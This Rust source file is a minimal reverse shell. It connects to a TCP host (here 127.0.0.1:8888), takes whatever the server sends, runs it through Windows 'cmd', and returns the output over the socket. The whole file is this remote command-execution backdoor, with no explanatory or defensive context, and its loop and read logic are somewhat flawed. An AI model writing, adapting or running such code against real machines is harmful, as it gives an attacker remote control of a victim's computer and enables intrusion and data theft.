use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() {
    let ip_address: String = String::from("127.0.0.1:8888");
    match TcpStream::connect(&ip_address) {
        Ok(mut stream) => {
            println!("Successfully connected to {}", stream.peer_addr().unwrap());

            loop {
                let mut data: Vec<u8> = vec![];
                //getting from server data
                match stream.read_to_end(&mut data) {
                    Ok(_) => {
                        print!("Ok");
                        if !data.is_empty() {
                            let command = String::from_utf8(data).unwrap();
                            let output = Command::new("cmd")
                                .arg(command)
                                .output()
                                .expect("Fail");

                            stream.write(String::from_utf8(output.stdout).unwrap().as_bytes()).unwrap();
                        }
                    }
                    Err(e) => {}
                }
            }
        }
        Err(e) => {
            println!("Error {}", e)
        }
    }
}
